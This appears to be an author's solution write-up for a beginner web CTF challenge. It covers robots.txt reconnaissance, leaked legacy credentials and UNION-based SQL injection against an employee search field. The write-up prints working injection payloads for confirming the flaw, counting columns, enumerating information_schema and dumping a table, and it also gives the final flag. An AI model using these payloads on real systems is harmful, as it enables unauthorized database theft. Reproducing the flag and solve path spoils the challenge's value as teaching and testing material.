# Solution: [Old School Stuff]

## Challenge Details

- **Category:** Web
- **Author:** [Rushaidy]
- **Difficulty:** 2/5

## Key Concepts

- Web reconnaissance
- Source code inspection
- Directory enumeration
- robots.txt discovery
- Legacy application discovery
- SQL Injection (UNION-based)
- Database schema enumeration
- Information Schema
- SQL query crafting

## Intended Solve Path

1. Access the challenge webpage and begin exploring the application.
2. Participants are encouraged to inspect the page source and observe any comments, references, or clues that suggest remnants of an older system.

Although inspecting the source provides hints, it is not strictly required.

---

## Step 1: Discover Legacy Resources

Participants should enumerate directories using their preferred methodology.

Possible approaches include:

- Reading `robots.txt`
- Directory fuzzing (Gobuster, FFUF, Burp Suite, etc.)
- Manual guessing

The intended discovery is:

```text
/robots.txt
```

which reveals:

```text
/legacy
/legacy/archive
```

Even if `robots.txt` is skipped, directory enumeration should eventually uncover the same paths.

---

## Step 2: Explore the Legacy Directories

Navigate through the discovered directories.

Inside `/legacy/archive`, participants will recover two important files:

- `migration_notes.txt`
- Backup credentials

The migration notes disclose valuable information regarding the application's database, including table names that will become useful later.

The leaked credentials allow participants to authenticate into the employee portal.

---

## Step 3: Explore the Portal

After logging in, participants are free to inspect the various pages.

Several pages exist to simulate a realistic internal portal and serve as distractions.

The page of interest is the:

```text
Employee Directory
```

This page contains a search functionality that is vulnerable to SQL Injection.

---

## Step 4: Confirm SQL Injection

Participants should begin testing the search field using common SQL injection payloads.

For example:

```sql
' OR '1'='1
```

Successful responses indicate that the search parameter is vulnerable.

---

## Step 5: Determine the Number of Columns

The next objective is to determine how many columns the underlying query expects.

This can be achieved using techniques such as:

### ORDER BY

```sql
' ORDER BY 1 -- -
```

Increment the column index until an error occurs.

or

### UNION SELECT

```sql
' UNION SELECT NULL,NULL,NULL -- -
```

Adjust the number of `NULL` values until the query executes successfully.

---

## Step 6: Enumerate Database Schema

Using the table names recovered from `migration_notes.txt`, participants should enumerate the column names through MySQL's `information_schema`.

Example:

```sql
' UNION SELECT 1,column_name,data_type
FROM information_schema.columns
WHERE table_name='internal_notes' -- -
```

This reveals the schema of the target table.

---

## Step 7: Extract the Records

After identifying the relevant columns, participants can retrieve records from the desired table.

Example:

```sql
' UNION SELECT * FROM internal_notes -- -
```

or craft a query targeting the relevant entry:

```sql
' UNION SELECT *
FROM internal_notes
WHERE title LIKE '%' -- -
```

Depending on the injection point, participants may need to experiment with the payload structure in order to correctly escape the original SQL statement.

---

## Final Flag

```text
sentCTF{all_r0ads_l3ad_t0_un10n}
```

## Hints

1. Old applications are rarely removed completely.
2. Hidden directories can sometimes be more revealing than the homepage.
3. Database metadata can be just as valuable as application data.
4. UNION is often the key to retrieving information from another table.

## Notes For Reviewers

This challenge introduces participants to a realistic web application assessment workflow. Rather than immediately exploiting SQL Injection, participants must first perform reconnaissance to uncover legacy resources, recover leaked credentials, and identify database table names from archived documentation. Only after gaining authenticated access are they expected to identify and exploit a UNION-based SQL Injection vulnerability, enumerate the database schema using `information_schema`, and retrieve sensitive records. The challenge emphasizes the importance of methodical reconnaissance, understanding SQL query structure, and adapting payloads to fit the application's backend query.